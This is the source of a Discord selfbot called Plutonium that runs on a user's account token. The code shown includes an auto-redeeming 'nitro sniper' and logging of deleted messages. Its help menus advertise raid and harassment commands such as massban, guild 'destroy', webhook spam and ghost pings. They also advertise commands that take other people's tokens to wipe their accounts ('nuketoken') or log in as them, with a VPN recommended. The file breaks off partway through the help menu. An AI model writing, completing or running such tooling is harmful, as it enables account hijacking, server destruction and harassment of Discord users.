### IF YOU PAID FOR THIS YOU HAVE BEEN SCAMMED - https://github.com/DevMystical/Plutonium-SelfBot ###

# Created by Mystical in Jan-Feb 2021
# If you skid rip this you are gay
# I don't have windows so create an Issue on the GitHub if there is something broken, but that
# goes for all bugs. Enjoy!

import os
print("\033]0;Plutonium SelfBot - By Mystical\007")
os.system('cls' if os.name == 'nt' else 'clear')
import json, random, string, time, datetime, itertools, asyncio, re
try:
	import discord
	from discord.ext import commands
	import aiohttp
except:
	print("Please install discord.py using 'pip3 install discord.py' or 'python3 -m pip install discord.py'")
	exit()
try:
	import requests
	import pypresence
	import nest_asyncio
except:
	print("Please ensure you have the following python modules installed: [requests, pypresence, nest-asyncio]\nInstall script:\npip3 install requests; pip3 install pypresence; pip3 install nest-asyncio")
	exit()

class c:
	BL = '\033[30m'
	R  = '\033[31m'
	LR = '\033[1;31m'
	G  = '\033[32m'
	YE = '\033[93m'
	B  = '\033[34m'
	LB = '\033[1;34m'
	MA = '\033[35m'
	CY = '\033[36m'
	W  = '\033[37m'
	RS = '\033[0m'
	EC = '\033[0m'
	BD = '\033[1m'
	UL = '\033[4m'

	X = '\033[0m'
	Y = '\033[31m'

print("")
print(f"   {c.X}██████{c.Y}╗ {c.X}██{c.Y}╗     {c.X}██{c.Y}╗   {c.X}██{c.Y}╗{c.X}████████{c.Y}╗ {c.X}██████{c.Y}╗ {c.X}███{c.Y}╗   {c.X}██{c.Y}╗{c.X}██{c.Y}╗{c.X}██{c.Y}╗   {c.X}██{c.Y}╗{c.X}███{c.Y}╗   {c.X}███{c.Y}╗")
print(f"   {c.X}██{c.Y}╔══{c.X}██{c.Y}╗{c.X}██{c.Y}║     {c.X}██{c.Y}║   {c.X}██{c.Y}║╚══{c.X}██{c.Y}╔══╝{c.X}██{c.Y}╔═══{c.X}██{c.Y}╗{c.X}████{c.Y}╗  {c.X}██{c.Y}║{c.X}██{c.Y}║{c.X}██{c.Y}║   {c.X}██{c.Y}║{c.X}████{c.Y}╗ {c.X}████{c.Y}║")
print(f"   {c.X}██████{c.Y}╔╝{c.X}██{c.Y}║     {c.X}██{c.Y}║   {c.X}██{c.Y}║   {c.X}██{c.Y}║   {c.X}██{c.Y}║   {c.X}██{c.Y}║{c.X}██{c.Y}╔{c.X}██{c.Y}╗ {c.X}██{c.Y}║{c.X}██{c.Y}║{c.X}██{c.Y}║   {c.X}██{c.Y}║{c.X}██{c.Y}╔{c.X}████{c.Y}╔{c.X}██{c.Y}║")
print(f"   {c.X}██{c.Y}╔═══╝ {c.X}██{c.Y}║     {c.X}██{c.Y}║   {c.X}██{c.Y}║   {c.X}██{c.Y}║   {c.X}██{c.Y}║   {c.X}██{c.Y}║{c.X}██{c.Y}║╚{c.X}██{c.Y}╗{c.X}██{c.Y}║{c.X}██{c.Y}║{c.X}██{c.Y}║   {c.X}██{c.Y}║{c.X}██{c.Y}║╚{c.X}██{c.Y}╔╝{c.X}██{c.Y}║")
print(f"   {c.X}██{c.Y}║     {c.X}███████{c.Y}╗╚{c.X}██████{c.Y}╔╝   {c.X}██{c.Y}║   ╚{c.X}██████{c.Y}╔╝{c.X}██{c.Y}║ ╚{c.X}████{c.Y}║{c.X}██{c.Y}║╚{c.X}██████{c.Y}╔╝{c.X}██{c.Y}║ ╚═╝ {c.X}██{c.Y}║")
print(f"   {c.Y}╚═╝     ╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝     ╚═╝{c.EC}")	
print(f"                        {c.EC}Plutonium SelfBot - By Mystical                      ")
print(f"\n\n                              {c.LB}Loading SelfBot...                      ")

def log(text, event="Command sent:"):
	print(f" {c.R}[{c.LR}{time.strftime('%I:%M:%S')}{c.EC}{c.R}] {c.EC}{event} {c.LR}{text}{c.EC}")

def logitem(text):
	print(f"    {c.EC}-> {c.LR}{text}{c.EC}")

class MsgEmbed(discord.Embed):
	def __init__(self, text, footer):
		super().__init__()
		self.description = text
		self.footer_cont = footer
		self.color = 0xff781f
		self.set_footer(text=f"𝘿𝙚𝙫𝙈𝙮𝙨𝙩𝙞𝙘𝙖𝙡/𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢-𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - {footer}", icon_url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHEoOaI3YUCBy3h7kZ_kr4PCj9FkHLLIoeKQ&usqp=CAU")
		self.set_author(icon_url=plutonium.user.avatar_url, name=plutonium.user)
	
	async def send(self, context):
		msg = None
		if use_embeds:
			try:
				msg = await context.send(embed=self)
				if delete_delay > 0:
					await msg.delete(delay=delete_delay)
			except discord.errors.Forbidden:
				logitem(f"Embed permissions are {c.EC}disabled{c.LR} for that channel, using the text version instead.")
				msg = await context.send(f" **Plutonium** [{self.footer_cont}] **->** {self.description}")
				if delete_delay > 0:
					await msg.delete(delay=delete_delay)
		else:
			msg = await context.send(f" **Plutonium** [{self.footer_cont}] **->** {self.description}")
			if delete_delay > 0:
				await msg.delete(delay=delete_delay)
		return msg

class ImgEmbed(discord.Embed):
	def __init__(self, url, footer):
		super().__init__()
		self.url = url
		self.set_image(url=self.url)
		self.footer_cont = footer
		self.color = 0xff781f
		self.set_footer(text=f"𝘿𝙚𝙫𝙈𝙮𝙨𝙩𝙞𝙘𝙖𝙡/𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢-𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - {footer}", icon_url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHEoOaI3YUCBy3h7kZ_kr4PCj9FkHLLIoeKQ&usqp=CAU")
		self.set_author(icon_url=plutonium.user.avatar_url, name=plutonium.user)
	
	async def send(self, context):
		msg = None
		if use_embeds:
			try:
				msg = await context.send(embed=self)
				if delete_delay > 0:
					await msg.delete(delay=delete_delay)
			except discord.errors.Forbidden:
				logitem(f"Embed permissions are {c.EC}disabled{c.LR} for that channel, using the text version instead.")
				msg = await context.send(self.url)
				if delete_delay > 0:
					await msg.delete(delay=delete_delay)
		else:
			msg = await context.send(self.url)
			if delete_delay > 0:
				await msg.delete(delay=delete_delay)
		return msg

class StdEmbed(discord.Embed):
	def __init__(self):
		super().__init__()
		self.color = 0xff781f
		self.set_footer(text=f"𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - 𝙈𝙮𝙨𝙩𝙞𝙘𝙖𝙡 - 𝘿𝙚𝙫𝙈𝙮𝙨𝙩𝙞𝙘𝙖𝙡/𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢-𝙎𝙚𝙡𝙛𝘽𝙤𝙩", icon_url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHEoOaI3YUCBy3h7kZ_kr4PCj9FkHLLIoeKQ&usqp=CAU")
		self.set_author(icon_url=plutonium.user.avatar_url, name=plutonium.user)
		if use_thumbnail:
			self.set_thumbnail(url=thumbnail)
	
	async def send(self, context):
		msg = None
		if use_embeds:
			try:
				msg = await context.send(embed=self)
				if delete_delay > 0:
					await msg.delete(delay=delete_delay)
			except discord.errors.Forbidden:
				logitem(f"Embed permissions are {c.EC}disabled{c.LR} for that channel, using the text version instead.")
				send_msg = flatten_embed(self)
				msg = await context.send(send_msg)
				if delete_delay > 0:
					await msg.delete(delay=delete_delay)
		else:
			send_msg = flatten_embed(self)
			msg = await context.send(send_msg)
			if delete_delay > 0:
				await msg.delete(delay=delete_delay)
		return msg

def flatten_embed(embed: discord.Embed) -> str:
	send_msg = ""
	if not embed.title == discord.Embed.Empty:
		send_msg += f"__**{embed.title}**__"
	if not embed.description == discord.Embed.Empty:
		send_msg += f"\n**{embed.description}**"
	for field in embed.fields:
		if not field.name == "\u200B":
			send_msg += f"\n**{field.name if not field.name[-1] == ':' else field.name[:-1]}:** {field.value}"
	return send_msg

async def webhook_send(url, content):
	connection = aiohttp.ClientSession()
	try:
		wh = discord.Webhook.from_url(url, adapter=discord.AsyncWebhookAdapter(connection))
		await wh.send(content)
	except:
		await connection.close()
		return False
	await connection.close()
	return True

try:
	with open("PlutoniumConfig.json") as PlutoniumConfig:
		user_data = json.load(PlutoniumConfig)
except:
	print("Please ensure that the configuration file is included and formatted correctly.")
	exit()

token = user_data["Discord Token"]
bot_prefix = user_data["Bot Prefix"]
thumbnail = user_data["Thumbnail Icon Url"]
use_thumbnail = user_data["Use Thumbnail on Embeds"]
use_embeds = user_data["Use Embeds"]
nitro_sniper = user_data["Nitro Sniper"]
logging_enabled = user_data["Show Logs for all Actions"]
delete_delay = user_data["Delete Delay (0 = Do not delete messages)"]
google_key = user_data["Google API Key"]

# For more information see the rate command. This is optional.
service = None
use_google_api = False
try:
	from googleapiclient import discovery
	service = discovery.build("commentanalyzer", "v1alpha1", developerKey=google_key)
	use_google_api = True
except:
	print("The Google API Client threw an error. If it is not installed and you do not wish to use it this message can be safely ignored. However, if it is broken please double check your API key.")

snipe_data = {}
uptime_start = None
copy_user_id = 0
dyn_nick = False
do_loops = True
restart_bot = False
first_bootup = True
do_reaction_spam = False
reaction_spam_target = 0
reaction_spam_word = ""
reactions = "🇦🇧🇨🇩🇪🇫🇬🇭🇮🇯🇰🇱🇲🇳🇴🇵🇶🇷🇸🇹🇺🇻🇼🇽🇾🇿"
dev_mode = False
rpc_start = time.time()
server_count = 0
friend_count = 0

plutonium = commands.Bot(description="Plutonium SelfBot - By Mystical", command_prefix=bot_prefix, self_bot=True)
plutonium.remove_command("help")

request = requests.Session()
headers = {"Authorization".replace("\r", ""): token}
data = request.get('https://discord.com/api/v6/users/@me', headers=headers).json()
if "message" in data:
	print(f"{c.YE}FATAL ERROR{c.EC} - Invalid Token. Please check that you inputted the correct value into {c.LR}PlutoniumConfig.json{c.EC}")
api_guilds = requests.get('https://canary.discord.com/api/v6/users/@me/guilds', headers=headers).json()
server_count = len(api_guilds)
relationships = request.get('https://canary.discord.com/api/v6/users/@me/relationships', headers=headers).json()
for rel in relationships:
	if rel['type'] == 1:
		friend_count += 1

nest_asyncio.apply()
# COMMENT OUT TO DISABLE RICH PRESENCE #
rpc = pypresence.Presence("811001190635536466", loop=asyncio.get_event_loop())
rpc.connect()
rpc.update(state=f"Friend Count: {friend_count}", details=f"Guild Count: {server_count}", large_image="radioactive", small_image="python3", start=rpc_start)
# STOP COMMENTING HERE #
	      
@plutonium.event
async def on_connect():
	global first_bootup
	if first_bootup:
		global uptime_start
		uptime_start = time.perf_counter()
		print(f"{c.LB}\033[F\033[F\033[F================================================================================{c.EC}")
		print(f"{c.R} [+] {c.EC}Connected to discord!                           ")
		print(f"       -> Using Prefix: {c.LR}{bot_prefix}{c.EC}" + " " * 30)	
		print(f"       -> Token: {c.LR}{''.join(('*' if not char == '.' else '.') for char in token)}{c.EC}")
		print(f"       -> User ID: {c.LR}{plutonium.user.id}{c.EC}")
		print(f"       -> Username: {c.LR}{plutonium.user.name} {c.EC}({c.LR}#{plutonium.user.discriminator}{c.EC})")
		print(f"       -> Allow Embeds: {c.LR}{use_embeds}{c.EC}")
		print(f"       -> Nitro Sniper: {c.LR}{nitro_sniper}{c.EC}")
		print(f"       -> Show Logs: {c.LR}{logging_enabled}{c.EC}")
		print(f"       -> Delete After: {c.LR}{delete_delay} {f'{c.EC}(None)' if delete_delay == 0 else ''}{c.EC}")
		print(f"{c.LB}================================================================================{c.EC}\n")
		first_bootup = False
	else:
		log(f"Welcome back {plutonium.user.name}!", "Client resumed connection:")
	
@plutonium.event
async def on_message_delete(message):
	if message.author == plutonium.user:
		return
	snipe_data[message.channel.id] = (message.content, str(message.author))

@plutonium.event
async def on_message(message):
	if 'discord.gift/' in message.content:
		if nitro_sniper:
			code = re.search("discord.gift/(.*)", message.content).group(1)
			response = requests.post(f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', headers={"Authorization": token}).text
			log(f"discord.gift/{code}", "Nitro sniped:")
			if message.guild:
				logitem(f"Guild: {c.EC}{message.guild.name}{c.LR} - Guild ID: {c.EC}{message.guild.id}{c.LR}")
			logitem(f"Sender: {c.EC}{message.author}{c.LR} - Sender ID: {c.EC}{message.author.id}{c.LR}")
			logitem(f"Channel: {c.EC}{message.channel.name}{c.LR} - Channel ID: {c.EC}{message.channel.id}{c.LR}")
			if 'This gift has been redeemed already.' in response:
				log("Someone already claimed that gift.", "Nitro Sniped:")
			elif 'subscription_plan' in response:
				log("Nitro has been claimed! Enjoy!", "Nitro Sniped:")
			elif 'Unknown Gift Code' in response:
				log("Unknown or invalid gift code.", "Nitro Sniped:")
	if str(plutonium.user.id) in message.content or str(plutonium.user) in message.content or str(plutonium.user.mention) in message.content or plutonium.user.name in message.content:
		if not message.author == plutonium.user:
			log(f"{c.EC}{message.author}{c.LR} is talking about you!", "Mention Logs:")
			logitem(message.content)
	if message.content.find(bot_prefix) == 0 and message.author == plutonium.user:
		try:
			await message.delete()
			log(message.content)
		except:
			pass
	else:
		if do_reaction_spam:
			try:
				if message.author.id == reaction_spam_target and not message.embeds:
					for let in reaction_spam_word:
						emoji = reactions[string.ascii_lowercase.index(let)]
						await message.add_reaction(emoji)
			except:
				pass
		if message.author.id == copy_user_id:
			try:
				await message.channel.send(f"**{message.author} says:** {message.content}".replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere"))
			except:
				pass
	if not message.author == plutonium.user:
		return
	await plutonium.process_commands(message)

@plutonium.event
async def on_command_error(ctx, error: commands.CommandError):
	if isinstance(error, discord.ext.commands.CommandNotFound):
		await MsgEmbed(f"Unknown command. Do `{bot_prefix}help` for a list of valid commands.", "Unkown Command").send(ctx)
		if not dev_mode:
			return
	if not dev_mode:
		log(ctx.message.content, f"There was an {c.EC}error{c.LR} processing your command:")
	else:
		print(f"{c.LB}                                COMMAND ERROR{c.EC}")
		raise(error.__cause__)

@plutonium.event
async def on_bulk_message_delete(messages):
	if logging_enabled:
		log(f"Bulk message delete in {c.EC}{messages[0].guild.name}{c.LR} - {c.EC}{len(messages)}{c.LR} message(s)", "Logging:")
		logitem(f"Channel ID: {c.EC}{messages[0].channel.id}{c.LR} - Guild ID: {c.EC}{messages[0].guild.id}{c.LR}")

@plutonium.event
async def on_guild_channel_create(channel):
	if logging_enabled:
		log(f"Channel created in {c.EC}{channel.guild.name}{c.LR} - {c.EC}'{channel.name}'{c.LR}", "Logging:")
		logitem(f"Channel ID: {c.EC}{channel.id}{c.LR} - Guild ID: {c.EC}{channel.guild.id}{c.LR}")

@plutonium.event
async def on_guild_channel_delete(channel):
	if logging_enabled:
		log(f"Channel deleted in {c.EC}{channel.guild.name}{c.LR} - {c.EC}'{channel.name}'{c.LR}", "Logging:")
		logitem(f"Channel ID: {c.EC}{channel.id}{c.LR} - Guild ID: {c.EC}{channel.guild.id}{c.LR}")

@plutonium.event
async def on_guild_join(guild):
	if logging_enabled:
		log(f"Client just joined {c.EC}{guild.name}{c.LR}", "Logging:")
		logitem(f"Guild ID: {c.EC}{guild.id}{c.LR}")

@plutonium.event
async def on_guild_remove(guild):
	if logging_enabled:
		log(f"Client was just removed from {c.EC}{guild.name}{c.LR}", "Logging:")
		logitem(f"Guild ID: {c.EC}{guild.id}{c.LR}")

@plutonium.event
async def on_guild_role_create(role):
	if logging_enabled:
		log(f"New role created in {c.EC}{role.guild.name}{c.LR} - {c.EC}'{role.name}'{c.LR}", "Logging:")
		logitem(f"Role ID: {c.EC}{role.id}{c.LR}")

@plutonium.event
async def on_guild_role_delete(role):
	if logging_enabled:
		log(f"Role deleted in {c.EC}{role.guild.name}{c.LR} - {c.EC}'{role.name}'{c.LR}", "Logging:")
		logitem(f"Role ID: {c.EC}{role.id}{c.LR}")

@plutonium.event
async def on_member_ban(guild, user):
	if logging_enabled:
		log(f"Member {c.EC}'{user}'{c.LR} was banned from {c.EC}{guild.name}{c.LR}", "Logging:")
		logitem(f"User ID: {c.EC}{user.id}{c.LR} - Guild ID: {c.EC}{guild.id}{c.LR}")

@plutonium.event
async def on_invite_create(invite):
	if logging_enabled:
		log(f"New invite created for {c.EC}{invite.guild.name}{c.LR} ({c.EC}{invite.guild.id}{c.LR})", "Logging:")
		logitem(f"{c.EC}{invite.url}{c.LR}")

@plutonium.event
async def on_invite_delete(invite):
	if logging_enabled:
		log(f"Invite deleted from {c.EC}{invite.guild.name}{c.LR} ({c.EC}{invite.guild.id}{c.LR})", "Logging:")
		logitem(f"{c.EC}{invite.url}{c.LR}")

@plutonium.event
async def on_group_join(channel, user):
	if logging_enabled:
		log(f"{c.EC}{user}{c.LR} was added to {c.EC}{channel.name if channel.name else 'Unnamed Channel'}{c.LR}", "Logging:")
		logitem(f"Number of members: {c.EC}{len(channel.recipients)}{c.LR}")

@plutonium.event
async def on_group_remove(channel, user):
	if logging_enabled:
		log(f"{c.EC}{user}{c.LR} was removed from {c.EC}{channel.name if channel.name else 'Unnamed Channel'}{c.LR}", "Logging:")
		logitem(f"Number of members: {c.EC}{len(channel.recipients)}{c.LR}")
	
@plutonium.command()
async def help(ctx, category=""):
	cat = category.lower()
	embed = StdEmbed()
	if not cat:
		embed.title = "𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - 𝙈𝙖𝙞𝙣 𝙈𝙚𝙣𝙪"
		embed.description = f"Categories of commands to choose from. Do `{bot_prefix}help <category>` for more information on a set of commands."
		embed.add_field(name=":hammer_pick: Moderation", value="Commands to moderate guilds and messages", inline=True)
		embed.add_field(name=":fire: Chaos", value="Destruction, pings, and other assorted wonders", inline=True)
		embed.add_field(name=":mag: Information", value="Get information about guilds, users, roles, and channels", inline=True)
		embed.add_field(name=":grey_question: Miscellaneous (Misc)", value="Manage your messages, guilds, and other things", inline=True)
		embed.add_field(name=":wrench: Utility", value="View bot data and manage attributes of the self-bot")
		embed.add_field(name=":joy: Fun", value="All other commands for fun and laughter. Mostly harmless.", inline=True)
		embed.add_field(name=":speech_balloon: Text", value="Commands for manipulating and formatting text messages.", inline=True)
		embed.add_field(name=":milky_way: Image", value="Fun image commands. Memes, Tweets, etc.", inline=True)
		embed.add_field(name=":hot_face: NSFW", value="You know exactly what this is. Hentai, Porn, etc.", inline=True)

	elif cat == "mod" or cat == "moderation":
		embed.title = "𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - 𝙈𝙤𝙙𝙚𝙧𝙖𝙩𝙞𝙤𝙣"
		embed.description = f"Various commands for moderation. These are mostly for actual moderation. If you are looking for more destructive commands, do {bot_prefix}help chaos."
		embed.add_field(name=f"`{bot_prefix}ban <user> <delmsg>`", value="Ban a user from the current guild. Optional: Delete message from the past __ days.", inline=False)
		embed.add_field(name=f"`{bot_prefix}kick <user>`", value="Kick a user from the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}spurge <amount>`", value="Delete a certain number of your own messages from the current channel.", inline=False)
		embed.add_field(name=f"`{bot_prefix}purge <amount>`", value="Delete messages from all users in the current channel.", inline=False)
		embed.add_field(name=f"`{bot_prefix}unbanall`", value="Revoke every ban in the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}hackban <user> <delmsg>`", value="Ban someone who isn't in the guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}delch`", value="Delete the current channel.", inline=False)
		embed.add_field(name=f"`{bot_prefix}delclone`", value="Create a copy of the current channel and delete the old one.", inline=False)
		embed.add_field(name=f"`{bot_prefix}clone`", value="Create a copy of the current channel.", inline=False)
		embed.add_field(name=f"`{bot_prefix}gname`", value="Change the name of the current guild.", inline=False)
	
	elif cat == "chaos":
		embed.title = "𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - 𝘾𝙝𝙖𝙤𝙨"
		embed.description = "Commands that are fairly destructive and should be used cautiously. These commands can be used to destroy and obliterate."
		embed.add_field(name=f"`{bot_prefix}massban`", value="Ban every user in the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}masskick`", value="Kick every user in the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}rolenuke`", value="Create the maximum number of roles.", inline=False)
		embed.add_field(name=f"`{bot_prefix}channuke`", value="Spam create channels in the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}delchannels`", value="Delete every channnel in the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}delroles`", value="Delete every role in the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}destroy`", value="Completely obliterate a guild. (Very destructive)", inline=False)
		embed.add_field(name=f"`{bot_prefix}renamechannels <name>`", value="Rename every channel in the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}hooks <hooks per channel>`", value="Create a certain number of webhooks in every channel of the current guild. They will be saved to a file, which will be printed in the console.", inline=False)
		embed.add_field(name=f"`{bot_prefix}hookspam <quantity per webhook> <message> <optional - guild id>`", value="Spam all of the webhooks that are on file for a guild. This is especially annoying because they have to be deleted manually.", inline=False)
		embed.add_field(name=f"`{bot_prefix}tokeninfo <token>`", value="Show all available information about the given disord token.\n(VPN Recommended, Requires Confirmation)", inline=False)
		embed.add_field(name=f"`{bot_prefix}nuketoken <token>`", value="Destructive is an understatement. The given token will have all of its friends, servers, and direct messages deleted. Use with caution.\n(VPN STRONGLY Recommended, Requires Confirmation)", inline=False)
		embed.add_field(name=f"`{bot_prefix}checktoken <token>`", value="Check if a token exists and is a real account.", inline=False)
		embed.add_field(name=f"`{bot_prefix}tokenlogin <token>`", value="Get a script that can be used to log in as a token", inline=False)

	elif cat == "info" or cat == "information":
		embed.title = "𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣"
		embed.description = "Get information on users, guilds, and channels."
		embed.add_field(name=f"`{bot_prefix}user <user>`", value="View information about a user.", inline=False)
		embed.add_field(name=f"`{bot_prefix}pfp <user>`", value="Get a user's profile picture.", inline=False)
		embed.add_field(name=f"`{bot_prefix}guild`", value="View information about the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}guildpfp`", value="View the icon for the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}channel`", value="View information about the current channel.", inline=False)
		embed.add_field(name=f"`{bot_prefix}first`", value="Get a link to the first message ever sent in the curernt channel.", inline=False)
		embed.add_field(name=f"`{bot_prefix}guilds`", value="View a list of all of the guilds you are a part of.", inline=False)

	elif cat == "misc" or cat == "miscellaneous":
		embed.title = "𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - 𝙈𝙞𝙨𝙘𝙚𝙡𝙡𝙖𝙣𝙚𝙤𝙪𝙨"
		embed.description = "Commands for working with messages, channels, and group chats, as well as other assorted things."
		embed.add_field(name=f"`{bot_prefix}readall`", value="Mark every guild you are in as read.", inline=False)
		embed.add_field(name=f"`{bot_prefix}read`", value="Mark the current guild as read.", inline=False)
		embed.add_field(name=f"`{bot_prefix}backup`", value="Create a backup of your friends and blocked list.", inline=False)
		embed.add_field(name=f"`{bot_prefix}gcleave`", value="Leave every group chat you are in.", inline=False)
		embed.add_field(name=f"`{bot_prefix}activity <type> <message>`", value="Change your activity (streaming, watching, etc.).", inline=False)
		embed.add_field(name=f"`{bot_prefix}hypesquad <house/random>`", value="Change your hypesquad or join a random one.", inline=False)
		embed.add_field(name=f"`{bot_prefix}embeds`", value="Toggle the use of embeds in messages and information panels.", inline=False)
		embed.add_field(name=f"`{bot_prefix}msgdelete <seconds>`", value="Number of seconds to wait before deleting bot response messages. Leave blank to disable.", inline=False)
		embed.add_field(name=f"`{bot_prefix}logging`", value="Toggle whether or not you want to be shown information about what happens to your account and the guilds you are in.", inline=False)

	elif cat == "annoy":
		embed.title = "𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - 𝘼𝙣𝙣𝙤𝙮"
		embed.description = "Commands designed to annoy your friends with pings, ghostpings, and spam."
		embed.add_field(name=f"`{bot_prefix}ghostping <user>`", value="This command will immediately delete and leave your friends wondering who pinged them.", inline=False)
		embed.add_field(name=f"`{bot_prefix}superping <user>`", value="Ghost ping a user in every text channel of the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}masssend <message>`", value="Send a message to every channel of the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}everyonespam`", value="Do an @\u200beveryone ping in every channel of the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}spam <amount> <message>`", value="Repeat the message a certain number of times.", inline=False)
		embed.add_field(name=f"`{bot_prefix}nickspam`", value="Repeatedly change your nickname in your current server. Disable by running the command again.", inline=False)
		embed.add_field(name=f"`{bot_prefix}selfreact <message>`", value="React to all of your messages with block letters. Alphabetical characters only.", inline=False)		
		embed.add_field(name=f"`{bot_prefix}react <user> <message>`", value="React to all of a user's messages with block letters. Alphabetical characters only.", inline=False)
		embed.add_field(name=f"`{bot_prefix}wall`", value="Send a single blank message that is 2,000 lines long.", inline=False)
		embed.add_field(name=f"`{bot_prefix}copy <user>`", value="Repeat everything someone says.", inline=False)
		embed.add_field(name=f"`{bot_prefix}arabic`", value="Spam '﷽' 2,000 times in a single message.", inline=False)

	elif cat == "util" or cat == "utility":
		embed.title = "𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - 𝙐𝙩𝙞𝙡𝙞𝙩𝙮"
		embed.description = "Commands to show data about the bot and view data from discord."
		embed.add_field(name=f"`{bot_prefix}uptime`", value="See how long it has been since the bot was started.", inline=False)
		embed.add_field(name=f"`{bot_prefix}ip <ip>`", value="Pull information on an IP Address such as country, state, ISP, etc.", inline=False)
		embed.add_field(name=f"`{bot_prefix}snipe`", value="View the last deleted message in the current channel.", inline=False)
		embed.add_field(name=f"`{bot_prefix}ping`", value="View the latency between you and discord's servers.", inline=False)
		embed.add_field(name=f"`{bot_prefix}prefix <prefix>`", value="Edit the prefix the bot uses. Requries a reboot to take effect.", inline=False)
		embed.add_field(name=f"`{bot_prefix}shutdown`", value="Shutdown Plutonium. Ends the program running the bot.", inline=False)
		embed.add_field(name=f"`{bot_prefix}restart`", value="Restart Plutonium. The bot will reboot and any changes made to PlutoniumConfig.json will take effect.", inline=False)
		embed.add_field(name=f"`{bot_prefix}clock`", value="Show what time it is on the server's side.", inline=False)
		embed.add_field(name=f"`{bot_prefix}cancel`", value="Very important command to cancel any current actions. This includes spam, nukes, deletions, timers, etc.", inline=False)
		embed.add_field(name=f"`{bot_prefix}countdown <time>`", value="Make a countdown timer of a certain length.", inline=False)
		embed.add_field(name=f"`{bot_prefix}leave`", value="Leave the current guild.", inline=False)
		embed.add_field(name=f"`{bot_prefix}whsend <hook> <message>`", value="Send a message to a valid webhook.", inline=False)
		embed.add_field(name=f"`{bot_prefix}devmode`", value="Turn on development mode, which will show all errors to the console instead of passing them.", inline=False)

	elif cat == "fun":
		embed.title = "𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - 𝙁𝙪𝙣"
		embed.description = f"Silly commands to use for enjoyment. These are typically harmless. For more harmful fun, do `{bot_prefix}help chaos`."
		embed.add_field(name=f"`{bot_prefix}nitro`", value="Create a random gift link.", inline=False)
		embed.add_field(name=f"`{bot_prefix}lulzsec`", value="Random quote from the LulzSec Flame Botnet FBI Prank Call.", inline=False)
		embed.add_field(name=f"`{bot_prefix}rickroll`", value="Never gonna give you up...", inline=False)
		embed.add_field(name=f"`{bot_prefix}fatass <user>`", value="Tell someone they are fat.", inline=False)
		embed.add_field(name=f"`{bot_prefix}virus <user>`", value="Alert a member that they need tech support.", inline=False)
		embed.add_field(name=f"`{bot_prefix}cancer`", value="Spam switch between light and dark mode.", inline=False)
		embed.add_field(name=f"`{bot_prefix}lyrics \"<artist>\" \"<song>\"`", value="View the lyrics for a song. Quotes are required for the artist and song name.", inline=False)
		embed.add_field(name=f"`{bot_prefix}ball <question>`", value="The 8-Ball has the answer to any question you can think of.", inline=False)

	elif cat == "text":
		embed.title = "𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - 𝙏𝙚𝙭𝙩"
		embed.description = "Commands that can be used for text formatting, information, and other various actions relating to strings."
		embed.add_field(name=f"`{bot_prefix}blank`", value="Send a one-line blank message.", inline=False)
		embed.add_field(name=f"`{bot_prefix}length <message>`", value="Show the length of some text.", inline=False)
		embed.add_field(name=f"`{bot_prefix}rate <type> <message>`", value="Rate a message based on its toxicity, insult factor, etc. Requires the Google API to be enabled. Leave the command blank to view valid attributes.", inline=False)
		embed.add_field(name=f"`{bot_prefix}blockletters <message>`", value="", inline=False)
		embed.add_field(name=f"`{bot_prefix}password`", value="Create a random and secure password.", inline=False)

	elif cat == "image" or cat == "img":
		embed.title = "𝙋𝙡𝙪𝙩𝙤𝙣𝙞𝙪𝙢 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 - 𝙄𝙢𝙖𝙜𝙚"
		embed.description = "Memes, image tools, and funny pictures are all in here. Note that some things are inside jokes for the bot's creator."
		embed.add_field(name=f"`{bot_prefix}vince`", value="Random gif of Vince McMahon.", inline=False)
		embed.add_field(name=f"`{bot_prefix}sake`", value="Random picture of sake", inline=False)
